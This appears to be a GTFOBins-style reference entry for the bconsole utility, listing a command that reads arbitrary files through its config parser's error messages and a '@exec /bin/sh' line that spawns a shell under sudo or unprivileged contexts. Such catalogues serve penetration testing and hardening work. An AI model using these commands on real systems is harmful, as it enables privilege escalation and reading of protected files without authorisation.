---
type: gtfobin
name: bconsole
platform: Unix
functions: [file-read, shell]
tags: [gtfobin, unix, lotl]
---

# bconsole

## file-read

```bash
bconsole -c /path/to/file-input
```
_The file is actually parsed and the first wrong line is returned in an error message._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
bconsole
@exec /bin/sh
```
**Contexts:** sudo, unprivileged
